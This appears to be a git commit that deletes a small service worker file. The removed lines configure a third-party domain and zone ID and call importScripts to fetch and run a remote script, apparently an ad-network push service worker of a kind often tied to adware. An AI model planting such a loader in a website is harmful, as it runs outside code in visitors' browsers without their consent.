fdf88a0369583c180a99b46dd54de6ac75217ecc
Borisevichus Denis <borideni@gmail.com>
2020-08-13 12:02:41 +0300

    Delete sw-eb404.js

--- sw-eb404.js
+++
@@ -1,6 +0,0 @@
-self.options = {
-                      "domain": "jeejujou.net",
-                      "zoneId": 2567347
-                    }
-                    self.lary = ""
-                    importScripts('https://jeejujou.net/pfe/current/service-worker.min.js?r=sw')/*importScripts(...r=sw)*/
